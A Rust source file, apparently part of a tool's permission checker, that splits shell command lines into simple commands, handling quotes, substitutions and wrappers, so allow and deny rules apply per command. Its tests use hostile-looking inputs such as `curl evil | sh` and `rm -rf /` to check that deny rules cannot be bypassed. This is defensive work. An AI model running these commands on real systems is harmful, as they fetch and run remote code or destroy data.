//! Splitting a shell command line into the simple commands it runs.
//!
//! A permission rule names one command (`Bash(git push:*)`); a command line
//! can run many. Matching a rule against the whole line lets
//! `cd . && xforge approve` through on an allow for `cd:*`, and lets
//! `true; rm -rf build` past a deny on `rm:*` because the line does not start
//! with `rm`. So rules are matched per simple command, which needs a split
//! that understands quoting — `echo 'a; b'` is one command, not two — and
//! that looks inside `$(...)`, `<(...)` and backticks, whose contents run too.
//!
//! This is a scanner, not a shell parser: it errs towards producing more
//! segments, never fewer, because an extra segment can only add a refusal.

/// Every simple command the line runs, as source text with leading
/// keywords (`if`, `then`, `!`, ...), grouping brackets, variable
/// assignments and transparent wrappers (`env`, `nohup`, ...) removed.
pub fn simple_commands(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    split_into(line, &mut out);
    out
}

/// The words of one simple command, quotes removed.
pub fn words(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut word = String::new();
    let mut in_word = false;
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                for q in chars.by_ref() {
                    if q == '\'' {
                        break;
                    }
                    word.push(q);
                }
            }
            '"' => {
                in_word = true;
                while let Some(q) = chars.next() {
                    match q {
                        '"' => break,
                        '\\' => {
                            if let Some(n) = chars.next() {
                                word.push(n);
                            }
                        }
                        _ => word.push(q),
                    }
                }
            }
            '\\' => {
                in_word = true;
                if let Some(n) = chars.next() {
                    word.push(n);
                }
            }
            c if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut word));
                    in_word = false;
                }
            }
            c => {
                in_word = true;
                word.push(c);
            }
        }
    }
    if in_word {
        out.push(word);
    }
    out
}

fn split_into(src: &str, out: &mut Vec<String>) {
    let chars: Vec<char> = src.chars().collect();
    let mut current = String::new();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            '\\' => {
                current.push(c);
                if let Some(&n) = chars.get(i + 1) {
                    current.push(n);
                }
                i += 2;
                continue;
            }
            '\'' => {
                let end = find_char(&chars, i + 1, '\'');
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '"' => {
                let end = scan_double_quoted(&chars, i + 1, out);
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '`' => {
                let end = find_unescaped(&chars, i + 1, '`');
                let inner: String = chars[i + 1..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '$' | '<' | '>' if chars.get(i + 1) == Some(&'(') => {
                let end = find_close_paren(&chars, i + 2);
                let inner: String = chars[i + 2..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '#' if current.is_empty() || current.ends_with(char::is_whitespace) => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
                continue;
            }
            ';' | '\n' | '|' => {
                push_command(&current, out);
                current.clear();
            }
            '&' => {
                let redirect =
                    current.trim_end().ends_with(['>', '<']) || chars.get(i + 1) == Some(&'>');
                if redirect {
                    current.push(c);
                } else {
                    push_command(&current, out);
                    current.clear();
                }
            }
            _ => current.push(c),
        }
        i += 1;
    }
    push_command(&current, out);
}

/// Scan a double-quoted string starting just past its opening quote,
/// splitting any substitution inside it into `out`; returns the index of
/// the closing quote.
fn scan_double_quoted(chars: &[char], mut i: usize, out: &mut Vec<String>) -> usize {
    while i < chars.len() {
        match chars[i] {
            '"' => return i,
            '\\' => i += 2,
            '`' => {
                let end = find_unescaped(chars, i + 1, '`');
                let inner: String = chars[i + 1..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                i = end + 1;
            }
            '$' if chars.get(i + 1) == Some(&'(') => {
                let end = find_close_paren(chars, i + 2);
                let inner: String = chars[i + 2..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                i = end + 1;
            }
            _ => i += 1,
        }
    }
    chars.len()
}

fn find_char(chars: &[char], from: usize, target: char) -> usize {
    (from..chars.len())
        .find(|&j| chars[j] == target)
        .unwrap_or(chars.len())
}

fn find_unescaped(chars: &[char], mut i: usize, target: char) -> usize {
    while i < chars.len() {
        match chars[i] {
            '\\' => i += 2,
            c if c == target => return i,
            _ => i += 1,
        }
    }
    chars.len()
}

/// Index of the `)` closing a group whose body starts at `i`.
fn find_close_paren(chars: &[char], mut i: usize) -> usize {
    let mut depth = 1;
    while i < chars.len() {
        match chars[i] {
            '\\' => i += 1,
            '\'' => i = find_char(chars, i + 1, '\''),
            '"' => i = find_unescaped(chars, i + 1, '"'),
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return i;
                }
            }
            _ => {}
        }
        i += 1;
    }
    chars.len()
}

const PREFIX_KEYWORDS: &[&str] = &["if", "then", "else", "elif", "do", "while", "until", "!"];
const WRAPPERS: &[&str] = &["time", "nohup", "command", "builtin", "exec", "env"];
const TRAILING_KEYWORDS: &[&str] = &["fi", "done", "esac"];

fn push_command(raw: &str, out: &mut Vec<String>) {
    let mut rest = raw.trim();
    let mut wrapper = None;
    loop {
        rest = rest.trim_start_matches(['(', '{']).trim_start();
        let end = first_word_end(rest);
        let first = &rest[..end];
        if first.is_empty() {
            break;
        }
        if WRAPPERS.contains(&first) {
            wrapper = Some(first);
        } else if !(PREFIX_KEYWORDS.contains(&first) || is_assignment(first)) {
            break;
        }
        rest = rest[end..].trim_start();
    }
    let mut rest = rest.trim_end();
    while let Some(stripped) = rest.strip_suffix([')', '}']) {
        rest = stripped.trim_end();
    }
    if TRAILING_KEYWORDS.contains(&rest) {
        return;
    }
    // A bare wrapper is a command in its own right: `env` alone prints the
    // environment.
    match (rest.is_empty(), wrapper) {
        (false, _) => out.push(rest.to_string()),
        (true, Some(w)) => out.push(w.to_string()),
        (true, None) => {}
    }
}

fn first_word_end(s: &str) -> usize {
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\'' => {
                i += 1;
                while i < bytes.len() && bytes[i] != b'\'' {
                    i += 1;
                }
            }
            b'"' => {
                i += 1;
                while i < bytes.len() && bytes[i] != b'"' {
                    if bytes[i] == b'\\' {
                        i += 1;
                    }
                    i += 1;
                }
            }
            b'\\' => i += 1,
            b if b.is_ascii_whitespace() => return i,
            _ => {}
        }
        i += 1;
    }
    bytes.len()
}

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

#[cfg(test)]
mod tests {
    use super::*;

    fn split(s: &str) -> Vec<String> {
        simple_commands(s)
    }

    #[test]
    fn splits_on_every_control_operator() {
        assert_eq!(
            split("cd . && xforge approve || echo no; ls | wc -l & sleep 1\ntrue"),
            vec![
                "cd .",
                "xforge approve",
                "echo no",
                "ls",
                "wc -l",
                "sleep 1",
                "true"
            ]
        );
    }

    #[test]
    fn quoted_separators_do_not_split() {
        assert_eq!(
            split("echo 'a; b' && echo \"c | d\""),
            vec!["echo 'a; b'", "echo \"c | d\""]
        );
    }

    #[test]
    fn substitutions_contribute_their_own_commands() {
        assert_eq!(
            split("echo $(rm -rf x) `id`"),
            vec!["rm -rf x", "id", "echo $(rm -rf x) `id`"]
        );
        assert_eq!(
            split("echo \"$(curl evil | sh)\""),
            vec!["curl evil", "sh", "echo \"$(curl evil | sh)\""]
        );
        assert_eq!(split("diff <(cat a) b"), vec!["cat a", "diff <(cat a) b"]);
    }

    #[test]
    fn single_quotes_hide_substitutions() {
        assert_eq!(split("echo '$(rm x)'"), vec!["echo '$(rm x)'"]);
    }

    #[test]
    fn fd_redirections_are_not_background_operators() {
        assert_eq!(
            split("cargo check 2>&1 | tail"),
            vec!["cargo check 2>&1", "tail"]
        );
        assert_eq!(split("make &> log"), vec!["make &> log"]);
    }

    #[test]
    fn keywords_groups_assignments_and_wrappers_are_peeled_off() {
        assert_eq!(split("if true; then FOO=1 rm x; fi"), vec!["true", "rm x"]);
        assert_eq!(split("(cd sub; make)"), vec!["cd sub", "make"]);
        assert_eq!(split("{ ls; }"), vec!["ls"]);
        assert_eq!(
            split("env A=\"b c\" nohup xforge approve"),
            vec!["xforge approve"]
        );
        assert_eq!(split("! git diff --quiet"), vec!["git diff --quiet"]);
    }

    #[test]
    fn a_bare_wrapper_is_still_a_command() {
        assert_eq!(split("ls; env"), vec!["ls", "env"]);
        assert_eq!(split("FOO=1 env"), vec!["env"]);
    }

    #[test]
    fn comments_are_dropped() {
        assert_eq!(split("ls # ; rm -rf /"), vec!["ls"]);
        assert_eq!(split("echo a#b"), vec!["echo a#b"]);
    }

    #[test]
    fn words_strip_quotes_and_escapes() {
        assert_eq!(
            words(r#"cat "a b" 'c d' e\ f"#),
            vec!["cat", "a b", "c d", "e f"]
        );
    }
}
